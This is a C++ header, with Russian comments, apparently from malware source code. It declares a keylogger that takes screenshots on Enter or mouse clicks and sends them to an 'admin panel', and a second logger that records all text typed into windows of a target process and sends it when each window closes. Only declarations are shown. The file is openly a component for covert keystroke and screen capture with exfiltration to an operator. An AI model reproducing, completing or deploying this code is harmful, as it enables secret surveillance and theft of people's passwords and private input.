#pragma once

#include "core\keylogger.h"
#include "core\vector.h"

//стартует кейлогер который по нажатию Enter и левой кнопки мыши делает указанное количество скриншотов
//и отсылает их в админку
bool StartKeyLoggerFirstNScreenshot( int n );

class KeyLoggerFirstNScreenShot : public KeyLogger::ExecForFilterMsg
{

		int countScreenShot; //сколько скриншотов делать
		int curr; //номер текущего скриншота
		Mem::Data memScreenshot;

	protected:

		virtual void Exec( KeyLogger::FilterMsgParams& params );

	public:
		
		KeyLoggerFirstNScreenShot( KeyLogger::FilterMsgBase* filter, int countScr );

};

//логгирует ввод всех символов в процессе
class KeyLoggerAllChars : public KeyLogger::ExecForFilterMsg
{

		struct HwndText
		{
			HWND hwnd;
			HWND parent;
			StringBuilderStack<256> parentCaption;
			StringBuilder text;
			SYSTEMTIME beg, end;
			bool ignore;
		};

		Vector< MovedPtr<HwndText> > ctrls; //контролы с введенным в них текстом
		StringArray maskCaptions; //маски по которым определяем какое окно нужно логгировать

	protected:

		virtual void Exec( KeyLogger::FilterMsgParams& params );

	public:

		KeyLoggerAllChars( KeyLogger::FilterMsgBase* filter, StringArray& captions );
		~KeyLoggerAllChars();
		//по закрытию окна отправляет накопленные данные для этого окна
		void SendWindowData( HWND hwnd );

		static bool Start( const char* nameProcess );
};
